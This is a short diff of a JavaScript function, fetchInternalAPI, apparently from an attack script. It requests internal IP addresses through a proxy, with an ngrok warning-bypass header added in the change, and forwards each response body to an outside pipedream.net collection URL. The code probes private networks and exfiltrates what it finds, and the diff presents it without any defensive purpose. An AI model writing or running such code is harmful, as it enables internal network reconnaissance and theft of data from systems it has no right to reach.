@@ -15,15 +15,20 @@ function fetchInternalAPI() {
     localIps.forEach(ip => {
         
         const targetUrl = proxyUrl + encodeURIComponent(ip);
-        fetch(targetUrl)
-            .then(response => response.text())
-            .then(data => {
-                console.log(`Resp from ${ip} via proxy:`, data);
+        fetch(targetUrl, {
+            headers: {
+                "ngrok-skip-browser-warning": "true",
+                "User-Agent": "MyApp/0.0.1"
+            }
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log(`Resp from ${ip} via proxy:`, data);
 
-                
-                fetch("https://enltk7c15ubn.x.pipedream.net/?data=" + encodeURIComponent(data));
-            })
-            .catch(error => console.error(`Error fetching ${ip} via proxy:`, error));
+            
+            fetch("https://enltk7c15ubn.x.pipedream.net/?data=" + encodeURIComponent(data));
+        })
+        .catch(error => console.error(`Error fetching ${ip} via proxy:`, error));
     });
 }
 
